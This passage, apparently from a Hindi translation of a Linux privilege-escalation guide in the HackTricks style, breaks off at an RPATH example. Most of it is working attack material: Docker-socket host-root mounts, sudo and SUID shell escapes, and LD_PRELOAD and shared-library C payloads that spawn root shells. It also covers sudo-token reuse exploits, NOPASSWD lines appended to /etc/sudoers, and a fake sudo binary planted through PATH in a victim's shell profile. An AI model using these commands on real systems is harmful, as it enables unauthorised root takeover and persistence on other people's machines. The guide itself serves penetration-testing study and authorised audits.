अगर आप **किसी भी लिखने योग्य सॉकेट की पहचान करते हैं** (_अब हम Unix Sockets के बारे में बात कर रहे हैं और कॉन्फ़िग `.socket` फाइलों के बारे में नहीं_), तो **आप उस सॉकेट से संवाद कर सकते हैं** और शायद कोई कमजोरी का फायदा उठा सकते हैं।

### Unix Sockets की गणना करें
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**उदाहरण का शोषण:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP सॉकेट्स

ध्यान दें कि कुछ **सॉकेट्स HTTP** अनुरोधों के लिए सुन रहे हो सकते हैं (_मैं .socket फाइलों की बात नहीं कर रहा हूँ बल्कि उन फाइलों की जो यूनिक्स सॉकेट्स के रूप में काम कर रही हैं_). आप इसे इसके साथ जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि सॉकेट **HTTP अनुरोध के साथ प्रतिक्रिया देता है**, तो आप उसके साथ **संवाद** कर सकते हैं और शायद **कुछ कमजोरी का फायदा उठा सकते हैं**।

### लिखने योग्य Docker सॉकेट

**docker सॉकेट** आमतौर पर `/var/run/docker.sock` पर स्थित होता है और केवल `root` उपयोगकर्ता और `docker` समूह द्वारा लिखने योग्य होता है।\
यदि किसी कारण से **आपके पास उस सॉकेट पर लिखने की अनुमति है** तो आप विशेषाधिकार बढ़ा सकते हैं।\
निम्नलिखित आदेशों का उपयोग विशेषाधिकार बढ़ाने के लिए किया जा सकता है:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### डॉकर वेब API का उपयोग सॉकेट से बिना डॉकर पैकेज के करें

यदि आपके पास **docker socket** तक पहुँच है लेकिन आप डॉकर बाइनरी का उपयोग नहीं कर सकते (शायद यह इंस्टॉल भी नहीं है), तो आप `curl` के साथ सीधे वेब API का उपयोग कर सकते हैं।

निम्नलिखित कमांड्स यह दर्शाते हैं कि कैसे **होस्ट सिस्टम की रूट को माउंट करने वाला एक डॉकर कंटेनर बनाया जाए** और नए डॉकर में कमांड्स को निष्पादित करने के लिए `socat` का उपयोग किया जाए।
```bash
# List docker images
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
# Send JSON to docker API to create the container
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
#{"Id":"<NewContainerID>","Warnings":[]}
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
अंतिम चरण `socat` का उपयोग करके कंटेनर से कनेक्शन शुरू करना है, जिसमें "attach" अनुरोध भेजा जाता है
```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp

#HTTP/1.1 101 UPGRADED
#Content-Type: application/vnd.docker.raw-stream
#Connection: Upgrade
#Upgrade: tcp
```
अब, आप इस `socat` कनेक्शन से कंटेनर पर कमांड्स एक्जीक्यूट कर सकते हैं।

### अन्य

ध्यान दें कि अगर आपके पास डॉकर सॉकेट पर लिखने की अनुमति है क्योंकि आप **`docker` समूह के अंदर हैं**, तो आपके पास [**अधिकार बढ़ाने के और भी तरीके हैं**](interesting-groups-linux-pe/#docker-group)। अगर [**डॉकर API एक पोर्ट पर सुन रहा है** तो आप उसे समझौता करने में सक्षम हो सकते हैं](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

डॉकर से बाहर निकलने या अधिकार बढ़ाने के लिए इसका दुरुपयोग करने के **और भी तरीके देखें**:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) अधिकार बढ़ाना

अगर आप पाते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **आप इसका दुरुपयोग करके अधिकार बढ़ा सकते हैं**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** अधिकार बढ़ाना

अगर आप पाते हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **आप इसका दुरुपयोग करके अधिकार बढ़ा सकते हैं**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-BUS एक **इंटर-प्रोसेस कम्युनिकेशन (IPC) सिस्टम** है, जो एक सरल फिर भी शक्तिशाली तंत्र प्रदान करता है **जिससे एप्लिकेशन एक दूसरे से बात कर सकते हैं**, जानकारी साझा कर सकते हैं और सेवाएं मांग सकते हैं। D-BUS को एक आधुनिक लिनक्स सिस्टम की जरूरतों को पूरा करने के लिए शुरू से डिजाइन किया गया था।

एक पूर्ण-विशेषता IPC और ऑब्जेक्ट सिस्टम के रूप में, D-BUS के कई इरादे हैं। पहला, D-BUS बुनियादी एप्लिकेशन IPC कर सकता है, जिससे एक प्रक्रिया दूसरे को डेटा भेज सकती है—सोचिए **UNIX डोमेन सॉकेट्स पर स्टेरॉयड**। दूसरा, D-BUS घटनाओं को भेजने में सहायता कर सकता है, या सिग्नल्स, सिस्टम के माध्यम से, जिससे सिस्टम के विभिन्न घटक संवाद कर सकते हैं और अंततः बेहतर एकीकृत हो सकते हैं। उदाहरण के लिए, एक ब्लूटूथ डेमन एक आने वाली कॉल सिग्नल भेज सकता है जिसे आपका म्यूजिक प्लेयर पकड़ सकता है, कॉल समाप्त होने तक वॉल्यूम को म्यूट कर देता है। अंत में, D-BUS एक रिमोट ऑब्जेक्ट सिस्टम लागू करता है, जिससे एक एप्लिकेशन अलग ऑब्जेक्ट से सेवाएं मांग सकता है और विधियों को आमंत्रित कर सकता है—सोचिए CORBA बिना जटिलताओं के। (यहां से [here](https://www.linuxjournal.com/article/7744))।

D-Bus एक **अनुमति/अस्वीकृति मॉडल** का उपयोग करता है, जहां प्रत्येक संदेश (मेथड कॉल, सिग्नल उत्सर्जन, आदि) को **अनुमति या अस्वीकृति** किया जा सकता है उससे मेल खाने वाले सभी नीति नियमों के योग के अनुसार। नीति में प्रत्येक नियम के पास `own`, `send_destination` या `receive_sender` विशेषता सेट होनी चाहिए।

`/etc/dbus-1/system.d/wpa_supplicant.conf` की नीति का एक हिस्सा:
```markup
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
इसलिए, यदि कोई नीति आपके उपयोगकर्ता को किसी भी तरह से **बस के साथ संवाद करने की अनुमति दे रही है**, तो आप इसका लाभ उठाकर विशेषाधिकार बढ़ा सकते हैं (शायद कुछ पासवर्ड की सूची बनाने के लिए?).

ध्यान दें कि एक **नीति** जो किसी भी उपयोगकर्ता या समूह का उल्लेख **नहीं करती** है, वह सभी पर लागू होती है (`<policy>`).\
"डिफ़ॉल्ट" संदर्भ की नीतियाँ सभी पर लागू होती हैं जो अन्य नीतियों द्वारा प्रभावित नहीं होते (`<policy context="default"`).

**यहाँ जानें कि D-Bus संचार को कैसे गिना जाए और इसका शोषण कैसे करें:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **नेटवर्क**

नेटवर्क का गणना करना और मशीन की स्थिति का पता लगाना हमेशा दिलचस्प होता है।

### सामान्य गणना
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट्स

हमेशा नेटवर्क सेवाओं की जांच करें जो मशीन पर चल रही हैं जिनसे आप पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### स्निफिंग

जांचें कि क्या आप ट्रैफिक स्निफ कर सकते हैं। यदि आप कर सकते हैं, तो आप कुछ क्रेडेंशियल्स प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## उपयोगकर्ता

### सामान्य सूचीकरण

जांचें **कौन** आप हैं, आपके पास कौन सी **विशेषाधिकार** हैं, सिस्टम में कौन से **उपयोगकर्ता** हैं, कौन लॉगिन कर सकते हैं और किनके पास **रूट विशेषाधिकार** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बिग UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो **UID > INT\_MAX** वाले उपयोगकर्ताओं को विशेषाधिकार बढ़ाने की अनुमति देता है। अधिक जानकारी: [यहाँ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [यहाँ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [यहाँ](https://twitter.com/paragonsec/status/1071152249529884674).\
**इसका उपयोग करें** : **`systemd-run -t /bin/bash`**

### समूह

जांचें कि क्या आप किसी **समूह के सदस्य हैं** जो आपको रूट विशेषाधिकार प्रदान कर सकते हैं:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### क्लिपबोर्ड

जांचें कि क्या क्लिपबोर्ड में (यदि संभव हो तो) कुछ दिलचस्प स्थित है
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आपको पर्यावरण का **कोई पासवर्ड पता है** तो **प्रत्येक उपयोगकर्ता के रूप में पासवर्ड का उपयोग करके लॉगिन करने का प्रयास करें**।

### Su Brute

यदि आपको बहुत अधिक शोर करने की परवाह नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरीज़ मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर ब्रूट-फोर्स करने का प्रयास कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं को ब्रूट-फोर्स करने का प्रयास करता है।

## लिखने योग्य PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप **$PATH के किसी फोल्डर के अंदर लिख सकते हैं** तो आप विशेषाधिकार बढ़ाने के लिए **लिखने योग्य फोल्डर के अंदर एक बैकडोर बना सकते हैं** जिसका नाम किसी ऐसे कमांड का हो जो एक अलग उपयोगकर्ता द्वारा (आदर्श रूप से रूट) निष्पादित किया जाने वाला है और जो **आपके लिखने योग्य फोल्डर से पहले स्थित फोल्डर से लोड नहीं किया जाता** है $PATH में।

### SUDO और SUID

आपको कुछ कमांड को sudo का उपयोग करके निष्पादित करने की अनुमति हो सकती है या उनके पास suid बिट हो सकता है। इसे जांचें उपयोग करके:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अप्रत्याशित कमांड्स आपको फाइलें पढ़ने और/या लिखने या यहां तक कि एक कमांड को निष्पादित करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo विन्यास किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता के विशेषाधिकारों के साथ कुछ कमांड निष्पादित करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, अब यह बहुत सरल है कि एक ssh कुंजी को रूट निर्देशिका में जोड़कर या `sh` को कॉल करके एक शेल प्राप्त किया जाए।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को **पर्यावरण चर सेट करने** की अनुमति देता है जबकि कुछ निष्पादित कर रहा हो:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB मशीन Admirer पर आधारित**, **संवेदनशील** था **PYTHONPATH हाइजैकिंग** के लिए जिससे कि एक मनमानी पायथन लाइब्रेरी को लोड किया जा सके जबकि स्क्रिप्ट को रूट के रूप में निष्पादित किया जा रहा हो:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo निष्पादन पथों को बायपास करना

**Jump** का उपयोग अन्य फाइलों को पढ़ने या **symlinks** का इस्तेमाल करने के लिए करें। उदाहरण के लिए sudoers फाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**प्रतिरक्षा उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary बिना command path के

यदि **sudo अनुमति** किसी एकल command को **path निर्दिष्ट किए बिना** दी गई है: _hacker10 ALL= (root) less_ आप इसका शोषण PATH variable बदलकर कर सकते हैं
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोग की जा सकती है जब एक **suid** बाइनरी **किसी अन्य कमांड को उसके पथ का उल्लेख किए बिना निष्पादित करती है (हमेशा अजीब SUID बाइनरी की सामग्री की जांच के लिए** _**strings**_ **का उपयोग करें)**।

[निष्पादित करने के लिए पेलोड उदाहरण।](payloads-to-execute.md)

### SUID बाइनरी कमांड पथ के साथ

यदि **suid** बाइनरी **किसी अन्य कमांड को पथ का उल्लेख करते हुए निष्पादित करती है**, तो, आपको उस कमांड के नाम से एक **फंक्शन को निर्यात करने** की कोशिश करनी चाहिए जिसे suid फाइल कॉल कर रही है।

उदाहरण के लिए, यदि suid बाइनरी _**/usr/sbin/service apache2 start**_ को कॉल करती है, तो आपको फंक्शन बनाने और निर्यात करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बाइनरी को कॉल करते हैं, यह फंक्शन निष्पादित होगा

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** एक वैकल्पिक पर्यावरणीय वेरिएबल है जिसमें एक या अधिक पथ होते हैं जो साझा लाइब्रेरीज़ या साझा ऑब्जेक्ट्स के लिए होते हैं, जिन्हें लोडर C रनटाइम लाइब्रेरी (libc.so) सहित किसी भी अन्य साझा लाइब्रेरी से पहले लोड करेगा। इसे लाइब्रेरी का प्रीलोडिंग कहते हैं।

_suid/sgid_ निष्पादन योग्य बाइनरीज़ के लिए इस तंत्र का उपयोग हमले के वेक्टर के रूप में होने से बचने के लिए, लोडर _LD\_PRELOAD_ को नजरअंदाज करता है अगर _ruid != euid_ हो। ऐसी बाइनरीज़ के लिए, केवल मानक पथों में मौजूद लाइब्रेरीज़ जो _suid/sgid_ भी हैं, प्रीलोड की जाएंगी।

यदि आप **`sudo -l`** के आउटपुट में वाक्य _**env\_keep+=LD\_PRELOAD**_ पाते हैं और आप किसी कमांड को sudo के साथ कॉल कर सकते हैं, तो आप विशेषाधिकार बढ़ा सकते हैं।
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
तब इसे **संकलित करें** इसका उपयोग करते हुए:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **विशेषाधिकार बढ़ाएं** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
यदि हमलावर **LD\_LIBRARY\_PATH** env वेरिएबल को नियंत्रित करता है तो एक समान privesc का दुरुपयोग किया जा सकता है क्योंकि वह उस पथ को नियंत्रित करता है जहां लाइब्रेरीज को खोजा जाएगा।
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so इंजेक्शन

यदि आपको कोई अजीब बाइनरी **SUID** अनुमतियों के साथ मिलती है, तो आप जांच सकते हैं कि क्या सभी **.so** फाइलें **सही ढंग से लोड** हो रही हैं। ऐसा करने के लिए आप निम्नलिखित कमांड चला सकते हैं:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
```markdown
उदाहरण के लिए, यदि आपको कुछ ऐसा मिलता है: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)_ आप इसका फायदा उठा सकते हैं।

फाइल _/home/user/.config/libcalc.c_ को निम्नलिखित कोड के साथ बनाएं:
```
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
इसे कंपाइल करें इसका उपयोग करके:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
और बाइनरी को निष्पादित करें।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID बाइनरी को उस फोल्डर से एक लाइब्रेरी लोड करते हुए पाया है जहां हम लिख सकते हैं, तो आवश्यक नाम के साथ उस फोल्डर में लाइब्रेरी बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको कोई त्रुटि मिलती है जैसे कि
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक क्यूरेटेड सूची है Unix बाइनरीज़ की जिन्हें हमलावर द्वारा स्थानीय सुरक्षा प्रतिबंधों को बायपास करने के लिए शोषित किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहां आप **केवल आर्ग्युमेंट्स इंजेक्ट कर सकते हैं** किसी कमांड में।

यह प्रोजेक्ट Unix बाइनरीज़ के वैध कार्यों को एकत्रित करता है जिनका दुरुपयोग करके सीमित शेल्स से बाहर निकला जा सकता है, अधिकारों को बढ़ाया या बनाए रखा जा सकता है, फाइलों का ट्रांसफर किया जा सकता है, बाइंड और रिवर्स शेल्स को स्पॉन किया जा सकता है, और अन्य पोस्ट-एक्सप्लॉइटेशन कार्यों को सुविधाजनक बनाया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं तो आप [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) टूल का उपयोग कर सकते हैं यह जांचने के लिए कि क्या यह किसी sudo नियम का शोषण करने का तरीका ढूंढ सकता है।

### Reusing Sudo Tokens

उस परिदृश्य में जहां **आपके पास एक यूजर के रूप में शेल है जिसके पास sudo विशेषाधिकार हैं** लेकिन आप उस यूजर का पासवर्ड नहीं जानते हैं, आप **इंतजार कर सकते हैं उसके किसी कमांड को `sudo` का उपयोग करके निष्पादित करने के लिए**। फिर, आप **उस सत्र का टोकन एक्सेस कर सकते हैं जहां sudo का उपयोग किया गया था और इसे किसी भी चीज को sudo के रूप में निष्पादित करने के लिए उपयोग कर सकते हैं** (विशेषाधिकार बढ़ाना)।

विशेषाधिकार बढ़ाने के लिए आवश्यकताएँ:

* आपके पास पहले से ही यूजर "_sampleuser_" के रूप में शेल है
* "_sampleuser_" ने **`sudo` का उपयोग करके कुछ निष्पादित किया है** पिछले 15 मिनटों में (डिफ़ॉल्ट रूप से यही सुदो टोकन की अवधि होती है जो हमें किसी भी पासवर्ड को पेश किए बिना `sudo` का उपयोग करने की अनुमति देती है)
* `cat /proc/sys/kernel/yama/ptrace_scope` 0 है
* `gdb` एक्सेसिबल है (आप इसे अपलोड कर सकते हैं)

(आप `ptrace_scope` को अस्थायी रूप से `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ सक्षम कर सकते हैं या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` को संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी आवश्यकताएँ पूरी होती हैं, तो **आप विशेषाधिकार बढ़ा सकते हैं उपयोग करके:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **पहला शोषण** (`exploit.sh`) _/tmp_ में बाइनरी `activate_sudo_token` बनाएगा। आप इसका उपयोग अपने सत्र में **सुदो टोकन को सक्रिय करने के लिए** कर सकते हैं (आपको स्वतः ही रूट शेल नहीं मिलेगा, करें `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **दूसरा एक्सप्लॉइट** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root द्वारा owned होगा setuid के साथ**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **तीसरा एक्सप्लॉइट** (`exploit_v3.sh`) एक **sudoers फाइल बनाएगा** जो **sudo टोकन्स को अनंत बनाता है और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास फ़ोल्डर में या फ़ोल्डर के अंदर बनाई गई किसी भी फ़ाइल पर **लिखने की अनुमति** है, तो आप [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) बाइनरी का उपयोग करके **एक उपयोगकर्ता और PID के लिए सुडो टोकन बना सकते हैं**।\
उदाहरण के लिए, यदि आप _/var/run/sudo/ts/sampleuser_ फ़ाइल को ओवरराइट कर सकते हैं और आपके पास उस उपयोगकर्ता के रूप में PID 1234 के साथ एक शेल है, तो आप पासवर्ड जाने बिना **सुडो विशेषाधिकार प्राप्त कर सकते हैं** करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल यूज़र root और ग्रुप root द्वारा पढ़ी जा सकती हैं**।\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप **कुछ दिलचस्प जानकारी प्राप्त कर सकते हैं**, और यदि आप कोई फ़ाइल **लिख** सकते हैं तो आप **अधिकार बढ़ा** सकते हैं।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प होते हैं जैसे कि OpenBSD के लिए `doas`, इसकी कॉन्फ़िगरेशन को `/etc/doas.conf` पर जांचना न भूलें
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **उपयोगकर्ता आमतौर पर एक मशीन से जुड़ता है और `sudo` का उपयोग करके विशेषाधिकार बढ़ाता है** और आपको उस उपयोगकर्ता के संदर्भ में एक शेल मिल गया है, तो आप **एक नया sudo निष्पादन योग्य बना सकते हैं** जो आपके कोड को रूट के रूप में निष्पादित करेगा और फिर उपयोगकर्ता का कमांड। फिर, **उपयोगकर्ता संदर्भ का $PATH संशोधित करें** (उदाहरण के लिए .bash\_profile में नया पथ जोड़ना) ताकि जब उपयोगकर्ता sudo निष्पादित करता है, आपका sudo निष्पादन योग्य निष्पादित होता है।

ध्यान दें कि यदि उपयोगकर्ता एक अलग शेल (bash नहीं) का उपयोग करता है तो आपको नया पथ जोड़ने के लिए अन्य फाइलों को संशोधित करना होगा। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py) में एक और उदाहरण पा सकते हैं।

या इस तरह कुछ चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा पुस्तकालय

### ld.so

फ़ाइल `/etc/ld.so.conf` यह दर्शाती है **कि लोड किए गए कॉन्फ़िगरेशन फ़ाइलें कहाँ से आई हैं**। आमतौर पर, इस फ़ाइल में निम्नलिखित पथ होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएंगी। यह कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डरों की ओर इशारा करती हैं** जहां **पुस्तकालयों** को **खोजा** जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर पुस्तकालयों की खोज करेगा**।

यदि किसी कारणवश **एक उपयोगकर्ता के पास लिखने की अनुमति है** निम्नलिखित पथों पर: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर किसी भी फ़ाइल पर या `/etc/ld.so.conf.d/*.conf` के अंदर कॉन्फ़िगरेशन फ़ाइल के भीतर किसी भी फ़ोल्डर पर, तो वह विशेषाधिकार बढ़ा सकता है।\
इस गलत कॉन्फ़िगरेशन का शोषण कैसे करें, इस पर एक नज़र डालें निम्नलिखित पृष्ठ पर:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
